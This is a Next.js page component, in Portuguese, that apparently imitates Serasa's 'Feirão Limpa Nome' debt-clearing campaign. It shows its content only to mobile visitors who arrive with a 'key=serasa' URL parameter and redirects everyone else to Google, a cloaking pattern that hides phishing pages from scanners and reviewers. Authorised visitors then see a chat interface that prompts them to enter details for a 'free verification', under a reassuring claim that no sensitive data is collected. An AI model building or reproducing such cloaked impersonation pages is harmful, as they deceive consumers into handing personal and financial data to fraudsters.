"use client"

import { useState, useEffect } from "react"
import { ChatInterface } from "@/components/chat-interface"

export default function Home() {
  const [showChat, setShowChat] = useState(true)
  const [isAuthorized, setIsAuthorized] = useState(false)

  useEffect(() => {
    // Verificação adicional no lado do cliente
    const url = window.location.href
    const chave = "serasa"
    const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent)
    const urlTemChave = url.includes(`key=${chave}`) || sessionStorage.getItem("serasa_authorized") === "true"

    if (isMobile && urlTemChave) {
      setIsAuthorized(true)
      sessionStorage.setItem("serasa_authorized", "true")

      // Mostra o conteúdo
      const conteudo = document.getElementById("conteudo")
      if (conteudo) {
        conteudo.style.display = "block"
      }
    } else {
      // Redireciona se não autorizado
      window.location.href = "https://www.google.com"
    }
  }, [])

  if (!isAuthorized) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-100">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#E80070] mx-auto mb-4"></div>
          <p className="text-gray-600">Verificando acesso...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="max-w-[430px] mx-auto min-h-screen bg-[#F5F7FA]">
      <div className="flex flex-col justify-center items-center bg-[#FCE6EF] p-5 min-h-screen">
        {/* Header */}
        <div className="bg-[#FFF5F8] rounded-2xl p-5 mb-5 shadow">
          <h2 className="text-center text-[#A3005A] text-xl font-bold mb-3">Etapas para consulta</h2>
          <p className="text-center">
            1. Informe para iniciar a verificação gratuita e participar do Feirão Limpa Nome.
          </p>
        </div>

        {/* Main Content */}
        <main className="w-full min-h-[440px] flex flex-col justify-end">
          {/* Chat Container */}
          <div className="h-[440px] mb-6 relative">
            <div className="w-full h-full rounded-xl bg-white shadow-lg overflow-hidden">
              {showChat && <ChatInterface />}
            </div>
          </div>

          {/* Info Box */}
          <p className="text-sm bg-white p-4 rounded-xl border-l-4 border-[#E80070] mb-7">
            Esta plataforma visa orientar os cidadãos sobre a regularização de registros financeiros em território
            nacional. Não coletamos dados sensíveis e atuamos de forma responsável e educativa.
          </p>
        </main>

        {/* Footer */}
        <footer className="text-xs">
          <a href="#" className="hover:underline">
            Política de privacidade
          </a>{" "}
          |{" "}
          <a href="#" className="hover:underline">
            Termos de uso
          </a>{" "}
          |{" "}
          <a href="#" className="hover:underline">
            Contato
          </a>
        </footer>
      </div>
    </div>
  )
}
